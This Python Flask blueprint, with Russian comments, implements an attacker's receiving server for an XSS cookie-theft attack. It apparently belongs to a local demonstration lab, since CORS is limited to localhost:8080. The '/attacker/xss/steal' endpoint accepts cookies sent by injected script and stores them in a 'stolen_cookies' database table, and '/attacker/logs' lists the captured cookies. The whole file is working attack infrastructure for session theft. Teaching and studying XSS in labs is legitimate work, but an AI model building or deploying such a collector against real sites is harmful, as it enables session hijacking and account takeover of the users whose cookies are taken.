from flask_cors import CORS, cross_origin
import psycopg2
from flask import Blueprint, request, jsonify, render_template
import db

attacker = Blueprint('attacker', __name__, template_folder='../templates', static_folder='../static')
CORS(attacker, origins=["http://localhost:8080"])  # Разрешить запросы с порта 8080

def get_db_connection():
    return db.get_db()

@attacker.route('/attacker', methods=['GET'])
@attacker.route('/attacker/', methods=['GET'])
def attacker_page():
    return render_template("main.html")

@attacker.route('/attacker/logs', methods=['GET'])
def get_stolen_cookies():
    """Возвращает список украденных куки из БД"""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT cookie, stolen_at FROM stolen_cookies ORDER BY stolen_at DESC;")
        cookies = cur.fetchall()
        cur.close()
        conn.close()

        # Явно формируем список словарей с куками
        return jsonify({"stolen_cookies": [{"cookie": row[0], "stolen_at": str(row[1])} for row in cookies]})
    except Exception as e:
        print(f"[ERROR] Ошибка базы данных: {str(e)}")
        return jsonify({"error": f"Ошибка базы данных: {str(e)}"}), 500





@attacker.route('/attacker/xss/steal', methods=['GET'])
@cross_origin(origins=["http://localhost:8080"])
def steal_cookies():
    stolen_cookie = request.args.get('cookie', 'Нет куки')
    print(f"[XSS COOKIE THEFT] Получен cookie: {stolen_cookie}")
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO stolen_cookies (cookie) VALUES (%s)", (stolen_cookie,))
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Ошибка записи в БД: {str(e)}")
    return jsonify({"message": "Cookie stolen!"}), 200